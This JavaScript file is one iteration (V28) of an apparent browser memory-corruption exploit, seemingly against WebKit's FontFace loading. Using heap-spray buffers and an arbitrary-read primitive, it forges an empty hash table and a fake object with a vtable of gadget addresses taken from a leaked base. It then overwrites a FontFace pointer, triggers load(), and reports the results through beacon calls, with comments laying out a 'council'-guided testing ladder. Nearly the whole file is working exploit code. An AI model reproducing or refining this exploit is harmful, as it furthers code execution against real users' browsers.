// V28 Patch: Born-Empty — the minimal cleanup/iteration machinery test
// (council-recommended, exact two-write diff from V27)
//
// V27-weaknull CRASHED — but its "zero dispatches" was CONDITIONAL: removeIf
// with a true predicate calls deleteBucket -> ~Ref<WeakPtrImpl> -> deref() ON
// OUR FAKE IMPL before the metadata writes. The crash may have been in the
// weak-entry REMOVAL itself.
//
// V28 removes even that: keyCount=0, ALL buckets empty. removeIf has nothing
// to remove, nothing to destroy, nothing to dereference. If the cleanup/
// iteration machinery on my 4-bucket table format is sound, this runs:
//   empty removeIf -> computeSize=0 -> begin()==end() -> empty iteration
//   -> BOTH status transitions (Pending->Loading->Failure) -> timer stop
//   -> RETURN.
//
// MANDATORY VALIDITY GATES before LOAD-PRE (direct hitBuf/sv reads only,
// NO readAt after crafting — the council's requirement):
//   G1: forge metadata {deleted=0, keyCount=0, mask=3, size=4} + 4 empty buckets
//   G2: face+0x58 == S+0x30
//   G3: face+0x60/+0x64 unchanged (template zeros)
//   G4: sources vector +0x48..0x57 with SIZE at +0x54 == 0 (the dirty-sources
//       hypothesis settled for free)
//   G5: status=0, override=1, timer hygiene intact
// A failed gate = DO NOT call load() (beacon GATE-FAIL and stop).
//
// LADDER (per the council):
//   V28 returns -> run V27b (weaknull verbatim) -> isolates weak-entry removal
//   V28 crashes -> run ?a=nulltable -> isolates the non-null table cleanup

/* ==== V28: BORN-EMPTY ==== */

try{
  if(MBUF>0n&&VP>0n&&bufs&&bufs.length>0&&fbRaw&&fbRaw.length>=128&&l2raw&&l2raw.length>=128){
    var FSG=BASE+0x5B3D6B0n, NOPG=BASE+0x4001750n;
    var mIdx=-1;
    var tH=readAt(MBUF+0x48n,8); var tV=qAt(tH,0);
    if((tV>>32n)===0xAAn)mIdx=Number(tV&0xFFFFFFFFn);
    bs('V28-TAG-mIdx='+mIdx);

    if(mIdx>=0&&mIdx<32){
      var sv=new DataView(window.__v688.spray[mIdx]);
      var S=MBUF;
      var hitBuf=bufs[0][0];

      /* ---- STEP 1: ALL readAt FIRST ---- */
      var promiseAddr=qAt(readAt(FB+0x18n,8),0);
      bs('V28-PROMISE-ADDR='+hex(promiseAddr));

      bs('V28-SIBLING-SCAN');
      var sib=0n, sibBk=0n;
      for(var sa=FB-0x2000n;sa<FB+0x2000n&&sib===0n;sa+=8n){
        var q0h=readAt(sa,8);
        if(qAt(q0h,0)===VP){
          var bkH=readAt(sa+0x10n,8);
          var bk=qAt(bkH,0);
          if(bk>0x1000000000n&&bk!==S&&bk!==FB&&bk!==self&&bk<0x10000000000n){sib=sa;sibBk=bk;}
        }
      }
      if(sibBk===0n){bs('V28-NO-SIBLING');verd('err','V28 no sibling');throw 'no sibling';}
      bs('V28-SIBLING='+hex(sib)+'-backing='+hex(sibBk));

      var timerH=readAt(sibBk+0x88n,0x38);
      bs('V28-TIMER-BORROWED='+timerH);

      /* ---- STEP 2: build the FORGE - BORN-EMPTY ---- */
      bs('V28-FORGE-BUILD');

      /* impl copy still built (for later arms) but UNREFERENCED in this run */
      for(var ib=0;ib<0x20;ib++)sv.setUint8(ib,parseInt(l2raw.substr(ib*2,2),16));
      dvSetBig(sv,0x08,0n);                     /* null m_ptr (unused - no entry) */

      /* THE TWO-WRITE DIFF FROM V27: keyCount=0, bucket[0]=empty */
      put32(sv,0x20,0);   /* deletedCount = 0 */
      put32(sv,0x24,0);   /* keyCount = 0  <-- BORN-EMPTY */
      put32(sv,0x28,3);   /* mask = 3 */
      put32(sv,0x2C,4);   /* size = 4 */

      dvSetBig(sv,0x30,0n);   /* bucket[0] = EMPTY  <-- BORN-EMPTY */
      dvSetBig(sv,0x38,0n);
      dvSetBig(sv,0x40,0n);
      dvSetBig(sv,0x48,0n);

      /* client + vtable still built (for later arms) but unreferenced */
      for(var cb=0;cb<0x40;cb++)sv.setUint8(0x50+cb,parseInt(fbRaw.substr(cb*2,2),16));
      dvSetBig(sv,0x50+0x00,S+0x90n);
      for(var vs=0;vs<8;vs++)dvSetBig(sv,0x90+vs*8,NOPG);
      dvSetBig(sv,0x90+0x18,FSG);

      bs('V28-FORGE-BUILT-T='+(S+0x30n).toString(16)+'-BORNEEMPTY-meta={0,0,3,4}');

      var preA=new Uint8Array(window.__v688.spray[mIdx].slice(0,0x100));

      /* ---- STEP 3: craft the FACE ---- */
      bs('V28-FACE-CRAFT');
      for(var sz=0x28;sz<=0x47;sz++)hitBuf[sz]=0;
      hitBuf[0x82]=0;
      hitBuf[0x83]=1;
      hitBuf[0x87]=1;
      for(var bl=0x84;bl<=0x89;bl++)hitBuf[bl]=1;
      for(var tb=0;tb<0x38;tb++)hitBuf[0x88+tb]=parseInt(timerH.substr(tb*2,2),16);
      for(var hz=0x98;hz<0xA8;hz++)hitBuf[hz]=0;
      for(var hz2=0xA8;hz2<0xB0;hz2++)hitBuf[hz2]=0;

      /* ---- STEP 4: install ---- */
      for(var hb=0;hb<8;hb++)hitBuf[0x58+hb]=Number(((S+0x30n)>>BigInt(hb*8))&0xFFn);

      /* ---- STEP 5: MANDATORY VALIDITY GATES (no readAt - direct reads) ---- */
      var gatesOK=true;

      /* G1: forge metadata + buckets */
      var g1meta=[dvGetBig(sv,0x20),dvGetBig(sv,0x28)];
      var g1buckets=[dvGetBig(sv,0x30),dvGetBig(sv,0x38),dvGetBig(sv,0x40),dvGetBig(sv,0x48)];
      bs('V28-G1-meta-d0='+dvGetBig(sv,0x20).toString()+'-kc='+dvGetBig(sv,0x24).toString()+'-mask='+dvGetBig(sv,0x28).toString()+'-size='+dvGetBig(sv,0x2C).toString());
      bs('V28-G1-buckets='+g1buckets.map(function(x){return x.toString(16);}).join(','));
      if(!(dvGetBig(sv,0x20)===0n&&dvGetBig(sv,0x24)===0n&&dvGetBig(sv,0x28)===3n&&dvGetBig(sv,0x2C)===4n)){gatesOK=false;bs('V28-G1-FAIL');}

      /* G2: face+0x58 == S+0x30 */
      var g2=0n; for(var g2b=0;g2b<8;g2b++)g2|=BigInt(hitBuf[0x58+g2b])<<BigInt(g2b*8);
      bs('V28-G2-face58='+hex(g2));
      if(g2!==(S+0x30n)){gatesOK=false;bs('V28-G2-FAIL');}

      /* G3: face+0x60/+0x64 unchanged (template zeros) */
      var g3=0n; for(var g3b=0;g3b<8;g3b++)g3|=BigInt(hitBuf[0x60+g3b])<<BigInt(g3b*8);
      bs('V28-G3-face60='+hex(g3));
      if(g3!==0n){gatesOK=false;bs('V28-G3-FAIL-nonzero');}

      /* G4: sources vector +0x48..0x57, SIZE at +0x54 == 0 */
      var g4src=Array.from(hitBuf.slice(0x48,0x58)).map(function(x){return x.toString(16);}).join(',');
      bs('V28-G4-sources48-57='+g4src);
      if(!(hitBuf[0x54]===0&&hitBuf[0x55]===0&&hitBuf[0x56]===0&&hitBuf[0x57]===0)){gatesOK=false;bs('V28-G4-FAIL-size-nonzero');}

      /* G5: status/override/timer */
      bs('V28-G5-status='+hitBuf[0x82]+'-override='+hitBuf[0x87]+'-timerVptr='+Array.from(hitBuf.slice(0x90,0x98)).map(function(x){return x.toString(16);}).join(',')+'-timerThread='+Array.from(hitBuf.slice(0xB0,0xB8)).map(function(x){return x.toString(16);}).join(','));
      if(!(hitBuf[0x82]===0&&hitBuf[0x87]===1)){gatesOK=false;bs('V28-G5-FAIL');}

      if(!gatesOK){
        bs('V28-GATE-FAIL-ABORT-NO-LOAD');
        verd('err','V28 gate fail - load() NOT called');
      }else{
        bs('V28-GATES-ALL-OK');

        /* ---- STEP 6: THE DISPATCH ---- */
        bs('V28-LOAD-PRE');
        var loadReturned=false;
        try{
          faces[zi].load();
          loadReturned=true;
          bs('V28-LOAD-RETURNED');
        }catch(e){
          bs('V28-LOAD-THREW-'+String(e&&e.message?e.message:'?'));
        }

        bs('V28-POST-returned='+loadReturned);
        bs('V28-STATUS-AFTER='+hitBuf[0x82]);
        try{bs('V28-JS-STATUS='+faces[zi].status);}catch(e){bs('V28-JS-STATUS-ERR');}

        /* post-load readbacks (readAt now safe) */
        var metaPost=readAt(S+0x20n,0x10);
        bs('V28-META-POST='+metaPost);
        var promiseAfter=readAt(promiseAddr,0x30);
        bs('V28-PROMISE-AFTER='+promiseAfter);

        var curA=new Uint8Array(window.__v688.spray[mIdx].slice(0,0x100));
        var diffs=[];
        for(var wq=0;wq<0x100;wq+=8){
          var cur=0n,old=0n;
          for(var wb=0;wb<8;wb++){
            cur|=BigInt(curA[wq+wb])<<BigInt(wb*8);
            old|=BigInt(preA[wq+wb])<<BigInt(wb*8);
          }
          if(cur!==old)diffs.push('@'+(S+BigInt(wq)).toString(16)+':'+old.toString(16)+'>'+cur.toString(16));
        }
        if(diffs.length)bs('WIT-V28-FORGE-WRITE-'+diffs.slice(0,10).join('|'));
        else bs('WIT-V28-FORGE-nowrite');

        for(var rb=0;rb<8;rb++)hitBuf[0x58+rb]=Number((L1>>BigInt(rb*8))&0xFFn);
        bs('V28-RESTORED');

        if(loadReturned){
          verd('ok','V28 born-empty load() RETURNED');
          bs('V28-DONE-RETURNED-machinery-clean');
        }else{
          verd('err','V28 born-empty crashed');
          bs('V28-DONE-CRASHED');
        }
      }

    }else bs('V28-SKIP-bad-idx');
  }else bs('V28-SKIP-missing-data');
}catch(e28){bs('V28-ERR-'+String(e28&&e28.message?e28.message:'?'));}
/* ==== V28 END ==== */
